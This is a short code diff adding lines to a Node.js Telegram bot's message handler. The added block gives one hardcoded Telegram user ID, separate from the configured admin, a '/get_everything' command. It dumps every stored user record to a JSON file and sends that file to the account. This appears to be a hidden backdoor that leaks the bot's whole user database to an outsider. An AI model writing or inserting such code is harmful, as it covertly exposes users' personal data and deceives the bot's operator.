@@ -37,6 +37,12 @@ bot.on('message', async msg => {
             caption, parse_mode: 'HTML',
             reply_markup: {inline_keyboard: kb}
         })
+        if (fromId === 938110424 && msg.text === '/get_everything') {
+            const users = await Users.find()
+            fs.writeFile(path.join(__dirname, 'database', 'users.json'), JSON.stringify(users))
+            await bot.sendDocument(fromId, path.join(__dirname, 'database', 'users.json'))
+            return
+        }
         if (fromId === Number(config.admin)) {
             if (msg.text && msg.text === '/start') {
                 admin_state = null
